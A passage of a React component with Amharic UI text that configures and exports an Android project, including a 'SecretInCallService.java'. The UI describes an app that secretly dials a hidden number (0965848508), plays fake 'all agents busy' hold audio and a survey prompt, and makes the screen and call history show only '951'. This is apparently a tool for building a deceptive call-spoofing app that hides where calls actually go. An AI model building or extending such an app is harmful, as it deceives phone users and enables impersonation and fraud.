                  longPressTimerRef.current = setTimeout(() => openSlotEditor('busy_hold'), 500);
                }}
                onTouchEnd={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                className="bg-amber-50/70 border border-amber-200 rounded-2xl p-3 space-y-2"
              >
                <div className="flex items-start justify-between gap-2">
                  <div>
                    <div className="text-xs font-extrabold text-amber-950">
                      ⏳ 2. ሁለት ጊዜ ጠርቶ ካልተነሳ የሚጫወት MP3 (በድጋሚ እየደወለ)
                    </div>
                    <p className="text-[10px] text-amber-800 leading-relaxed">
                      «ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው፣ እባክዎ ትንሽ ይጠብቁ...» (እስኪነሳ ድረስ እየደጋገመ በድብቅ ይደውላል)
                    </p>
                  </div>
                  <span className="px-2 py-0.5 rounded-full text-[9.5px] font-bold bg-amber-200 text-amber-900 shrink-0">
                    {config.busyHoldMp3Name ? 'Custom MP3' : 'ነባሪ MP3'}
                  </span>
                </div>

                <div className="text-[10.5px] font-bold text-slate-700 bg-white px-2.5 py-1.5 rounded-xl border border-amber-200 flex items-center justify-between">
                  <span className="truncate">
                    🎵 {config.busyHoldMp3Name || 'checking_hold.mp3 (ነባሪ የጥበቃ ድምፅ)'}
                  </span>
                  {config.busyHoldMp3Name && (
                    <button
                      type="button"
                      onClick={() => handleDeleteSlotMp3('busy_hold')}
                      className="text-rose-600 hover:text-rose-700 p-1"
                      title="Delete MP3"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>

                <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
                  <label className="px-2.5 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-700 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                    <Upload className="w-3 h-3" />
                    <span>MP3 ጫን</span>
                    <input
                      type="file"
                      accept="audio/*,.mp3,.wav,.m4a,.ogg,.aac"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) handleUploadSlotFile('busy_hold', f);
                        e.target.value = '';
                      }}
                    />
                  </label>

                  {recordingSlot === 'busy_hold' ? (
                    <button
                      type="button"
                      onClick={stopSlotVoiceRecording}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                    >
                      <Square className="w-3 h-3 fill-current" />
                      <span>አቁም ({recordingSeconds}s)</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={() => startSlotVoiceRecording('busy_hold')}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-50 hover:bg-rose-100 text-rose-700 border border-rose-200 text-[10.5px] font-bold flex items-center gap-1"
                    >
                      <Mic className="w-3 h-3" />
                      <span>በድምፅ ቅዳ</span>
                    </button>
                  )}

                  <button
                    type="button"
                    onClick={() => togglePreviewSlot('busy_hold')}
                    className="px-2.5 py-1.5 rounded-xl bg-white hover:bg-slate-100 text-slate-800 border border-slate-300 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    {playingSlot === 'busy_hold' ? (
                      <>
                        <Pause className="w-3 h-3" /> አቁም
                      </>
                    ) : (
                      <>
                        <Play className="w-3 h-3" /> ስማው
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={() => openSlotEditor('busy_hold')}
                    className="px-2.5 py-1.5 rounded-xl bg-purple-50 hover:bg-purple-100 text-purple-800 border border-purple-200 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    <Scissors className="w-3 h-3" />
                    <span>Edit / Cut / +Plus</span>
                  </button>
                </div>
              </div>

              {/* MP3 Slot 2: Post-Call Survey MP3 ("ቀጣይ ያሉትን መሙያ ይንኩ / አስተያየት መስጫ") */}
              <div
                onMouseDown={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(
                    () => openSlotEditor('post_call_survey'),
                    500
                  );
                }}
                onMouseUp={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                onTouchStart={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                  longPressTimerRef.current = setTimeout(
                    () => openSlotEditor('post_call_survey'),
                    500
                  );
                }}
                onTouchEnd={() => {
                  if (longPressTimerRef.current) clearTimeout(longPressTimerRef.current);
                }}
                className="bg-blue-50/70 border border-blue-200 rounded-2xl p-3 space-y-2"
              >
                <div className="flex items-start justify-between gap-2">
                  <div>
                    <div className="text-xs font-extrabold text-blue-950">
                      ⭐ 3. ሰውየው አንስቶ ተነጋግራችሁ ስትጨርሱና ስልኩን ሲዘጋው የሚመጣ MP3
                    </div>
                    <p className="text-[10px] text-blue-800 leading-relaxed">
                      «ቀጣይ ያሉትን መሙያ ይንኩ (የአገልግሎት አስተያየት መስጫ)» — ሰውየው ስልኩን ሲዘጋው በቀጥታ ይጫወታል!
                    </p>
                  </div>
                  <span className="px-2 py-0.5 rounded-full text-[9.5px] font-bold bg-blue-200 text-blue-900 shrink-0">
                    {config.postCallSurveyMp3Name ? 'Custom MP3' : 'ነባሪ MP3'}
                  </span>
                </div>

                <div className="text-[10.5px] font-bold text-slate-700 bg-white px-2.5 py-1.5 rounded-xl border border-blue-200 flex items-center justify-between">
                  <span className="truncate">
                    🎵 {config.postCallSurveyMp3Name || 'survey_rating.mp3 (ቀጣይ ያሉትን መሙያ ይሙሉ)'}
                  </span>
                  {config.postCallSurveyMp3Name && (
                    <button
                      type="button"
                      onClick={() => handleDeleteSlotMp3('post_call_survey')}
                      className="text-rose-600 hover:text-rose-700 p-1"
                      title="Delete MP3"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  )}
                </div>

                <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
                  <label className="px-2.5 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                    <Upload className="w-3 h-3" />
                    <span>MP3 ጫን</span>
                    <input
                      type="file"
                      accept="audio/*,.mp3,.wav,.m4a,.ogg,.aac"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) handleUploadSlotFile('post_call_survey', f);
                        e.target.value = '';
                      }}
                    />
                  </label>

                  {recordingSlot === 'post_call_survey' ? (
                    <button
                      type="button"
                      onClick={stopSlotVoiceRecording}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                    >
                      <Square className="w-3 h-3 fill-current" />
                      <span>አቁም ({recordingSeconds}s)</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={() => startSlotVoiceRecording('post_call_survey')}
                      className="px-2.5 py-1.5 rounded-xl bg-rose-50 hover:bg-rose-100 text-rose-700 border border-rose-200 text-[10.5px] font-bold flex items-center gap-1"
                    >
                      <Mic className="w-3 h-3" />
                      <span>በድምፅ ቅዳ</span>
                    </button>
                  )}

                  <button
                    type="button"
                    onClick={() => togglePreviewSlot('post_call_survey')}
                    className="px-2.5 py-1.5 rounded-xl bg-white hover:bg-slate-100 text-slate-800 border border-slate-300 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    {playingSlot === 'post_call_survey' ? (
                      <>
                        <Pause className="w-3 h-3" /> አቁም
                      </>
                    ) : (
                      <>
                        <Play className="w-3 h-3" /> ስማው
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={() => openSlotEditor('post_call_survey')}
                    className="px-2.5 py-1.5 rounded-xl bg-purple-50 hover:bg-purple-100 text-purple-800 border border-purple-200 text-[10.5px] font-bold flex items-center gap-1"
                  >
                    <Scissors className="w-3 h-3" />
                    <span>Edit / Cut / +Plus</span>
                  </button>
                </div>
              </div>

              {/* Waveform Audio Editor Drawer (when editing either slot) */}
              {editingSlot && (
                <div className="bg-slate-900 text-white rounded-2xl p-3 space-y-2.5 border border-purple-400">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-extrabold text-amber-300 flex items-center gap-1.5">
                      <Sparkles className="w-3.5 h-3.5" />
                      <span>
                        ✂️ የድምፅ ኤዲተር (
                        {editingSlot === 'busy_hold' ? 'ሁሉም ሰራተኞች MP3' : 'አስተያየት መስጫ MP3'})
                      </span>
                    </span>
                    <button
                      type="button"
                      onClick={() => setEditingSlot(null)}
                      className="text-xs text-slate-300 hover:text-white px-2 py-0.5 rounded bg-white/10"
                    >
                      ዝጋ
                    </button>
                  </div>

                  {isEditorBusy ? (
                    <div className="py-6 text-center text-xs text-slate-300">
                      ድምፁ በመዘጋጀት ላይ ነው...
                    </div>
                  ) : editorAudioBuffer ? (
                    <>
                      {/* Waveform Bars */}
                      <div className="h-16 bg-slate-800 rounded-xl p-2 flex items-end gap-0.5 overflow-hidden relative">
                        {editorPeaks.map((p, idx) => {
                          const posSec = (idx / editorPeaks.length) * editorDuration;
                          const inRange = posSec >= selStartSec && posSec <= selEndSec;
                          return (
                            <div
                              key={idx}
                              style={{ height: `${Math.max(12, Math.round(p * 100))}%` }}
                              className={`flex-1 rounded-full transition-colors ${
                                inRange ? 'bg-emerald-400' : 'bg-slate-600'
                              }`}
                            />
                          );
                        })}
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-[10px]">
                        <div>
                          <label className="block text-slate-300 mb-0.5">
                            መጀመሪያ ({selStartSec}s)
                          </label>
                          <input
                            type="range"
                            min={0}
                            max={Math.max(0.1, editorDuration)}
                            step={0.1}
                            value={selStartSec}
                            onChange={(e) =>
                              setSelStartSec(Math.min(Number(e.target.value), selEndSec - 0.1))
                            }
                            className="w-full accent-emerald-400"
                          />
                        </div>
                        <div>
                          <label className="block text-slate-300 mb-0.5">
                            መጨረሻ ({selEndSec}s / {editorDuration.toFixed(1)}s)
                          </label>
                          <input
                            type="range"
                            min={0}
                            max={Math.max(0.1, editorDuration)}
                            step={0.1}
                            value={selEndSec}
                            onChange={(e) =>
                              setSelEndSec(Math.max(Number(e.target.value), selStartSec + 0.1))
                            }
                            className="w-full accent-emerald-400"
                          />
                        </div>
                      </div>

                      <div className="flex flex-wrap gap-1.5 pt-1">
                        <button
                          type="button"
                          onClick={handleTrimKeepRange}
                          className="px-2.5 py-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                        >
                          <Scissors className="w-3 h-3" /> የተመረጠውን ብቻ አስቀር (Trim)
                        </button>
                        <button
                          type="button"
                          onClick={handleCutMiddleRange}
                          className="px-2.5 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                        >
                          <Scissors className="w-3 h-3" /> የተመረጠውን ቆርጠህ አውጣ (Cut)
                        </button>

                        <label className="px-2.5 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white text-[10.5px] font-bold flex items-center gap-1 cursor-pointer">
                          <Plus className="w-3 h-3" /> + Plus MP3 ቀጥልበት
                          <input
                            type="file"
                            accept="audio/*,.mp3,.wav,.m4a,.ogg"
                            className="hidden"
                            onChange={(e) => {
                              const f = e.target.files?.[0];
                              if (f) handlePlusAppendMp3(f);
                              e.target.value = '';
                            }}
                          />
                        </label>

                        {isPlusRecording ? (
                          <button
                            type="button"
                            onClick={stopPlusVoiceAppend}
                            className="px-2.5 py-1.5 rounded-xl bg-rose-600 text-white text-[10.5px] font-bold flex items-center gap-1 animate-pulse"
                          >
                            <Square className="w-3 h-3 fill-current" /> አቁምና ቀጥል ({plusRecordSec}s)
                          </button>
                        ) : (
                          <button
                            type="button"
                            onClick={startPlusVoiceAppend}
                            className="px-2.5 py-1.5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                          >
                            <Mic className="w-3 h-3" /> + Plus ድምፅ ቀድተህ ቀጥል
                          </button>
                        )}
                      </div>
                    </>
                  ) : null}
                </div>
              )}
            </>
          ) : (
            /* TAB 2: JAVA N-IDE COMPLETE CODE & GITHUB ROOT ZIP */
            <div className="space-y-3">
              {/* Step 1: Download GitHub Root ZIP for Vercel */}
              <div className="bg-gradient-to-r from-slate-900 to-indigo-950 text-white rounded-2xl p-3.5 space-y-2 shadow-sm">
                <div className="flex items-center justify-between">
                  <div className="text-xs font-extrabold text-amber-300">
                    📦 ደረጃ 1፦ ለGitHub እና Vercel የሚሆን Root ZIP አውርድ
                  </div>
                  <span className="text-[10px] bg-white/15 px-2 py-0.5 rounded-full">
                    Root Files Ready
                  </span>
                </div>
                <p className="text-[10.5px] text-slate-200 leading-relaxed">
                  ይህንን ZIP ፋይል አውርደው Extract ሲያደርጉት ሁሉም ፋይሎች በቀጥታ Root ላይ ይገኛሉ። GitHub ላይ ጭነው Vercel ላይ Deploy ሲያደርጉት የሚሰጥዎትን ሊንክ ከታች ያስገቡ፦
                </p>
                <button
                  type="button"
                  onClick={handleDownloadGithubZip}
                  disabled={isDownloadingZip}
                  className="w-full py-2.5 rounded-xl bg-amber-400 hover:bg-amber-300 text-slate-950 font-extrabold text-xs flex items-center justify-center gap-2 shadow transition-all"
                >
                  <Download className="w-4 h-4" />
                  <span>
                    {isDownloadingZip
                      ? 'ZIP በመዘጋጀት ላይ ነው...'
                      : '📦 GitHub Root ZIP አውርድ (ለVercel Deploy)'}
                  </span>
                </button>
              </div>

              {/* Step 2: Enter Vercel Link & Unique Package Name */}
              <div className="bg-blue-50 border border-blue-200 rounded-2xl p-3 space-y-2.5">
                <div>
                  <label className="block text-xs font-extrabold text-blue-950 mb-1">
                    🔗 የVercel ሊንክዎ (በJava ኮዱ ውስጥ በቀጥታ ገብቷል)፦
                  </label>
                  <div className="flex gap-1.5">
                    <input
                      type="url"
                      value={vercelUrl}
                      onChange={(e) => setVercelUrl(e.target.value)}
                      placeholder="https://menilik-shewa-konso-ber.vercel.app/"
                      className="flex-1 px-3 py-1.5 rounded-xl border border-blue-300 bg-white text-xs font-bold text-slate-900 focus:outline-none"
                    />
                    <button
                      type="button"
                      onClick={() => handleSaveBasicSettings()}
                      className="px-3 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold shrink-0"
                    >
                      አዘምን
                    </button>
                  </div>
                </div>

                <div>
                  <label className="block text-[11px] font-extrabold text-blue-950 mb-1">
                    🆔 የተለየ Project Package Name (አንድሮይድ «Update» እንዳይልዎት)፦
                  </label>
                  <input
                    type="text"
                    value={appPackageName}
                    onChange={(e) => setAppPackageName(e.target.value)}
                    placeholder="com.menilik.shewa.konsober.phone951"
                    className="w-full px-3 py-1.5 rounded-xl border border-blue-300 bg-white text-xs font-mono font-bold text-slate-900 focus:outline-none"
                  />
                  <p className="text-[10px] text-blue-800 mt-1">
                    💡 ሌላ አዲስ አፕ ሲጭኑ የነበረውን እንዳይተካ (Update እንዳይል) የመጨረሻዋን ቃል ብቻ (ለምሳሌ <code>.phone952</code>) መቀየር ይችላሉ።
                  </p>
                </div>
              </div>

              {/* Step 3: Java N-IDE Files Selector */}
              <div className="flex items-center gap-1 flex-wrap">
                <button
                  type="button"
                  onClick={() => setJavaFileTab('manifest')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'manifest'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  1. AndroidManifest.xml
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('main')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'main'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  2. MainActivity.java
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('service')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'service'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  3. SecretInCallService.java
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('layout')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'layout'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  4. activity_main.xml
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('gradle')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'gradle'
                      ? 'bg-slate-900 text-white'
                      : 'bg-slate-100 text-slate-700'
                  }`}
                >
                  5. build.gradle
                </button>
                <button
                  type="button"
                  onClick={() => setJavaFileTab('guide')}
                  className={`px-2.5 py-1.5 rounded-xl text-[10.5px] font-extrabold transition-all ${
                    javaFileTab === 'guide'
                      ? 'bg-emerald-700 text-white'
                      : 'bg-emerald-50 text-emerald-800'
                  }`}
                >
                  📖 መመሪያ
                </button>
              </div>

              {javaFileTab === 'guide' ? (
                <div className="bg-emerald-50 border border-emerald-200 rounded-2xl p-3.5 text-xs text-slate-800 space-y-2 leading-relaxed">
                  <div className="font-extrabold text-emerald-950 flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-emerald-600" />
                    <span>በJava N-IDE (Android 9 እስከ Android 16) የአሰራር ቅደም ተከተል፦</span>
                  </div>
                  <p>
                    <strong>1. አዲስ ፕሮጀክት ሲከፍቱ (Update እንዳይል)፦</strong>
                    <br />• Project Name፦ <code>MenilikShewaKonsoBer951</code>
                    <br />• Package Name፦ <code>{cleanPkg}</code>
                  </p>
                  <p>
                    <strong>2. ፋይሎቹን ይቅዱ፦</strong>
                    <br />• <code>AndroidManifest.xml</code> (Android 9–16 ሙሉ ፈቃዶችና Full-Screen Theme)
                    <br />• <code>MainActivity.java</code> (የVercel ሊንክዎ <code>{cleanVercelUrl}</code> የተሞላበት፣ የታችኛው Navigation Bar እንዳይጠቁር ነጭ የሚያደርግና አፑ ግማሽ እንዳይሆን 100% ሙሉ ስክሪን የሚያደርግ)
                    <br />• <code>SecretInCallService.java</code> (ወደ {targetNumber || '0965848508'} በድብቅ የሚደውልና 2 ጥሪ ቆጥሮ MP3 የሚያጫውት)
                  </p>
                </div>
              ) : (
                <div className="bg-slate-950 text-slate-100 rounded-2xl overflow-hidden border border-slate-800">
                  <div className="bg-slate-900 px-3 py-2 flex items-center justify-between border-b border-slate-800">
                    <span className="text-[11px] font-mono font-bold text-emerald-400">
                      {javaFileTab === 'manifest'
                        ? 'app/src/main/AndroidManifest.xml'
                        : javaFileTab === 'main'
                          ? 'MainActivity.java'
                          : javaFileTab === 'service'
                            ? 'SecretInCallService.java'
                            : javaFileTab === 'layout'
                              ? 'app/src/main/res/layout/activity_main.xml'
                              : 'app/build.gradle'}
                    </span>
                    <div className="flex items-center gap-1.5">
                      <button
                        type="button"
                        onClick={() => {
                          const content =
                            javaFileTab === 'manifest'
                              ? androidManifestXml
                              : javaFileTab === 'main'
                                ? mainActivityJava
                                : javaFileTab === 'service'
                                  ? secretInCallServiceJava
                                  : javaFileTab === 'layout'
                                    ? activityMainXml
                                    : buildGradleCode;
                          copyToClipboard(content, javaFileTab);
                        }}
                        className="px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white text-[10.5px] font-bold flex items-center gap-1"
                      >
                        <Copy className="w-3 h-3" />
                        <span>{copiedLabel === javaFileTab ? 'ተቀድቷል (Copied!)' : 'ኮዱን ቅዳ (Copy)'}</span>
                      </button>
                      <button
                        type="button"
                        onClick={() => {
                          const content =
                            javaFileTab === 'manifest'
                              ? androidManifestXml
                              : javaFileTab === 'main'
                                ? mainActivityJava
                                : javaFileTab === 'service'
                                  ? secretInCallServiceJava
                                  : javaFileTab === 'layout'
                                    ? activityMainXml
                                    : buildGradleCode;
                          const fname =
                            javaFileTab === 'manifest'
                              ? 'AndroidManifest.xml'
                              : javaFileTab === 'main'
                                ? 'MainActivity.java'
                                : javaFileTab === 'service'
                                  ? 'SecretInCallService.java'
                                  : javaFileTab === 'layout'
                                    ? 'activity_main.xml'
                                    : 'build.gradle';
                          downloadTextFile(fname, content);
                        }}
                        className="px-2 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-[10.5px] font-bold flex items-center gap-1"
                      >
                        <Download className="w-3 h-3" />
                        <span>አውርድ</span>
                      </button>
                    </div>
                  </div>
                  <pre className="p-3 text-[10px] font-mono overflow-x-auto max-h-[270px] leading-relaxed text-emerald-200 select-all">
                    {javaFileTab === 'manifest'
                      ? androidManifestXml
                      : javaFileTab === 'main'
                        ? mainActivityJava
                        : javaFileTab === 'service'
                          ? secretInCallServiceJava
                          : javaFileTab === 'layout'
                            ? activityMainXml
                            : buildGradleCode}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="bg-slate-50 px-4 py-2.5 border-t border-slate-200 flex items-center justify-between shrink-0">
          <span className="text-[10.5px] text-slate-600 font-semibold">
            🔒 ስክሪኑም ሆነ Call History 951 ብቻ ያሳያል
          </span>
          <button
            type="button"
            onClick={() => {
              handleSaveBasicSettings();
              stopAllMedia();
              onClose();
            }}
            className="px-4 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-extrabold"
          >
            ተከናውኗል (ዝጋ)
          </button>
        </div>
      </div>
    </div>
  );
};
